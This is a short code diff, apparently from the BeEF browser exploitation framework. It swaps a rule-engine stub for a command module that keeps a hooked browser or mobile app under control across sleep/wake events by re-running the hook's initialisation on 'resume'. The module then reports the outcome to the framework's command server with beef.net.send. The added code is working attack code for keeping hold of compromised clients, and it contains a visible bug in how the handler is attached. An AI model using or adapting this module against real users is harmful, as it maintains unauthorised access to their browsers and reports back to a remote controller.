@@ -12,14 +12,20 @@
 //   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 //   See the License for the specific language governing permissions and
 //   limitations under the License.
+
 //
-beef.are = {
-  init:function(){
-   var Jools = require('jools');
-   this.ruleEngine = new Jools();
-  },
-  rules:[],
-  commands:[],
-  results:[]
-};
-beef.regCmp("beef.are");
+// persist on over app's sleep/wake events
+beef.execute(function() {
+    var result;
+
+    try {
+        document.addEventListener("resume", beef_init(), false);
+        result = 'success';
+
+    } catch (e) {
+        for(var n in e) {
+            result+= n + " " + e[n] + "\n"; 
+        }
+    }
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
+});
